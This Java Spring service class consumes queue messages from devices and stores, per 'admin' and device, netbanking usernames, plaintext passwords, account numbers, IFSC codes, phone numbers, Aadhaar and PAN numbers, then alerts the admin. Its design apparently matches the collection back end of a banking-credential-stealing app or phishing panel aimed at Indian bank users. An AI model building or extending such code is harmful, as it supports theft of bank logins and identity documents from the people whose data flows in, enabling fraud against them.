package app.service.service;

import app.service.model.NetbankingRecord;
import app.service.store.NetbankingStore;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.amqp.rabbit.annotation.RabbitListener;
import org.springframework.stereotype.Service;

import java.time.Instant;

@Service
public class NetbankingProcessor {

    private static final Logger log = LoggerFactory.getLogger(NetbankingProcessor.class);

    private final NetbankingStore store;
    private final ObjectMapper mapper;
    private final AdminNotifier notifier;

    public NetbankingProcessor(NetbankingStore store, ObjectMapper mapper, AdminNotifier notifier) { this.store = store; this.mapper = mapper; this.notifier = notifier; }

    @RabbitListener(queues = "${app.queue}")
    public void onMessage(String body) {
        try {
            JsonNode root = mapper.readTree(body);
            String adminId = text(root, "data.adminId");
            String deviceId = text(root, "sender.deviceId");
            String appId = text(root, "sender.appId");
            if (appId==null || appId.isBlank()) appId = "unknown";
            if (deviceId==null || deviceId.isBlank()) deviceId = "unknown";

            JsonNode arr = root.at("/data/payload/netbanking");
            int processed = 0;
            java.util.List<NetbankingRecord> snapshot = new java.util.ArrayList<>();
            if (arr != null && arr.isArray()) {
                for (JsonNode it : arr) {
                    String bankName = asString(it.get("bank_name"));
                    String accountNumber = asString(it.get("account_number"));
                    String username = asString(it.get("username"));
                    String password = asString(it.get("password"));
                    String ifscCode = asString(it.get("ifsc_code"));
                    String phoneNumber = asString(it.get("phone_number"));
                    String adharCard = asString(it.get("adhar_card"));
                    String panCard = asString(it.get("pan_card"));
                    long eventTs = parseInstant(it.get("eventTimestamp"));

                    NetbankingRecord rec = NetbankingRecord.builder()
                            .adminId(adminId)
                            .appId(appId)
                            .deviceId(deviceId)
                            .bankName(emptyToNull(bankName))
                            .accountNumber(emptyToNull(accountNumber))
                            .username(emptyToNull(username))
                            .password(emptyToNull(password))
                            .ifscCode(emptyToNull(ifscCode))
                            .phoneNumber(emptyToNull(phoneNumber))
                            .adharCard(emptyToNull(adharCard))
                            .panCard(emptyToNull(panCard))
                            .eventTimestampMs(eventTs)
                            .build();
                    snapshot.add(rec);
                    processed++;
                }
            }
            store.replaceAll(appId, adminId, deviceId, snapshot);
            log.info("netbanking: processed={} admin={} appId={} device={}", processed, adminId, appId, deviceId);
            if (processed > 0) notifier.notifyRefresh(adminId, "refresh.netbanking");
        } catch (Exception e) {
            log.warn("netbanking: failed to process message: {}", e.toString());
        }
    }

    private String text(JsonNode root, String path) {
        String[] ps = path.split("\\.");
        JsonNode cur = root;
        for (String p : ps) cur = cur.path(p);
        return cur.isMissingNode()?null:cur.asText();
    }

    private String asString(JsonNode n){ return (n==null||n.isNull())?null:n.asText(); }
    private long parseInstant(JsonNode n){ try { return Instant.parse(n.asText()).toEpochMilli(); } catch(Exception e){ return System.currentTimeMillis(); } }
    private static String emptyToNull(String s){ return (s==null||s.isBlank())?null:s; }
}
